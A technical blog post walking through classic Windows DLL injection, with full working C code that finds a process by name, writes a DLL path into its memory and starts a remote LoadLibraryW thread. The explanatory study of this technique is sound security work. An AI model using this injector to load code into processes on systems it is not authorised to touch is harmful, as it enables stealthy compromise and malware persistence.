---
layout: post
title: "Injecting a DLL Into a Remote Process"
date: 2026-05-18
tags: [Process Injection]
description: "Exploring a process injection technique where we will enumerate running processes and inject a DLL into that process"
---

In this post I would like to explore first how to enumerate running processes, match a target process, and inject a DLL into that process.

The first thing to accomplish is to find all processes running on the machine which brings us to our first challenge.

## Process Enumeration and Finding a Target Process

Windows provides a very useful structure in tlhelp32.h called `PROCESSENTRY32`{:.language-c} which is parsed by the tlhelp32.h functions `CreateToolhelp32Snapshot`{:.language-c} `Process32First`{:.language-c} `Process32Next`{:.language-c}.

You can learn more about the structure from Microsoft here: [Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32)

A quick aside on that structure if you look into it, you will find that there are a fair amount of dead fields that have been around since like Win2k. I am not 100% sure why that is, but maintaining backwards compatability is the best I can come up with. I may look more into this in the future. 

Going back to `PROCESSENTRY32`{:.language-c}, there are 3 fields that matter for this technique:
+ `dwSize`{:.language-c} : this is going to be set to `sizeof(PROCESSENTRY32)`{:.language-c} which tells WinAPI what version of the structure the code is expecting
+ `th32ProcessID`{:.language-c} : this is the PID of the currently running process
+ `szExeFile`{:.language-c} : this is the process name as a string

```c
// given a target process name, returns a PID and an open handle to it
BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

    // initialize the struct with the necessary step of setting dwSize
    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };

    // takes a snapshot of all currently running processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed: %d\n", GetLastError());
        return FALSE;
    }

    // retrieves the first process from the snapshot
    if (!Process32First(hSnapshot, &pe)) {
        printf("[!] Process32First failed: %d\n", GetLastError());
        CloseHandle(hSnapshot);
        return FALSE;
    }

    // use a do-while loop to iterate through the snapshot looking for the target process
    do {
        // compare name we are on to name we are looking for
        if (wcscmp(pe.szExeFile, szProcessName) == 0) {
            // store the PID
            *dwProcessId = pe.th32ProcessID;
            // open a handle to the process with full access
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
            if (*hProcess == NULL) {
                printf("[!] OpenProcess failed: %d\n", GetLastError());
            }
            break;
        }
    } while (Process32Next(hSnapshot, &pe));

    // done with the snapshot so we close the handle to it
    CloseHandle(hSnapshot);

    // if we couldn't find the process or couldn't open a handle to it, fail
    if (*dwProcessId == 0 || *hProcess == NULL)
        return FALSE;

    return TRUE;
}
```

## DLL Injection

We now have what we need from the target process (we have a process handle), we then inject the DLL into the target process. The technique works like this:

1. Allocate memory in the target process to hold the path of the DLL we want to inject
2. Write the DLL path into that allocated memory
3. Get the address of `LoadLibraryW`{:.language-c} from `kernel32.dll`{:.language-c}
4. Create a remote thread in the target process that calls `LoadLibraryW`{:.language-c} with our DLL path as the argument

The reason this works is that `kernel32.dll`{:.language-c} is loaded at the same base address across all processes on a given boot, so the address of `LoadLibraryW`{:.language-c} in our process is the same address in the target process.

### Allocating and Writing Memory

We need to use `VirtualAllocEx`{:.language-c} to allocate a buffer inside the remote process, and then `WriteProcessMemory`{:.language-c} to write the full path of our DLL into that buffer. The allocation needs `PAGE_READWRITE`{:.language-c} permissions since `LoadLibraryW`{:.language-c} just needs to read the string.

### Getting the Address of LoadLibraryW

`GetModuleHandle`{:.language-c} gives us the base address of `kernel32.dll`{:.language-c} in our own process, and `GetProcAddress`{:.language-c} resolves `LoadLibraryW`{:.language-c} from that base. As mentioned above, because `kernel32.dll`{:.language-c} is mapped at the same address in every process, this address is valid in the target process as well.

### Creating the Remote Thread

Finally, `CreateRemoteThread`{:.language-c} spawns a new thread in the target process. We pass it the address of `LoadLibraryW`{:.language-c} as the thread start routine and our allocated DLL path buffer as the argument. 

```c
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR szDllPath) {

    SIZE_T sNumberOfBytesWritten  = 0;
    DWORD  dwThreadId             = 0;
    SIZE_T sDllPathSize           = (wcslen(szDllPath) + 1) * sizeof(WCHAR);

    // allocate memory in the remote process for the DLL path
    LPVOID pDllPathAddress = VirtualAllocEx(hProcess, NULL, sDllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pDllPathAddress == NULL) {
        printf("[!] VirtualAllocEx failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Allocated memory at 0x%p in remote process\n", pDllPathAddress);

    // write the DLL path into the allocated memory
    if (!WriteProcessMemory(hProcess, pDllPathAddress, szDllPath, sDllPathSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sDllPathSize) {
        printf("[!] WriteProcessMemory failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Wrote %zu bytes to remote process\n", sNumberOfBytesWritten);

    // get the address of LoadLibraryW which is valid in the remote process because kernel32.dll is mapped at the same base address across all processes
    LPVOID pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        printf("[!] GetProcAddress failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] LoadLibraryW address: 0x%p\n", pLoadLibraryW);

    // create a remote thread that calls LoadLibraryW with our DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pDllPathAddress, 0, &dwThreadId);
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Remote thread created with TID %d\n", dwThreadId);

    return TRUE;
}
```
### Implementing the main function and tying it together

```c
int wmain(int argc, wchar_t* argv[]) {

    DWORD  dwProcessId = 0;
    HANDLE hProcess    = NULL;

    if (argc != 3) {
        printf("Usage: %ls <process name> <DLL path>\n", argv[0]);
        printf("Example: %ls notepad.exe C:\\payload.dll\n", argv[0]);
        return -1;
    }

    LPWSTR szProcessName = argv[1];
    LPWSTR szDllPath     = argv[2];

    printf("[*] Searching for process: %ls\n", szProcessName);

    if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
        printf("[!] Could not find or open target process\n");
        return -1;
    }
    printf("[+] Found %ls with PID %d\n", szProcessName, dwProcessId);

    if (!InjectDllToRemoteProcess(hProcess, szDllPath)) {
        printf("[!] DLL injection failed\n");
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] DLL injected successfully\n");

    CloseHandle(hProcess);
    return 0;
}
```

## Seeing the DLL Injection in Action
![Dll Injection Diagram](/assets/images/dllinjection_diagram.png)

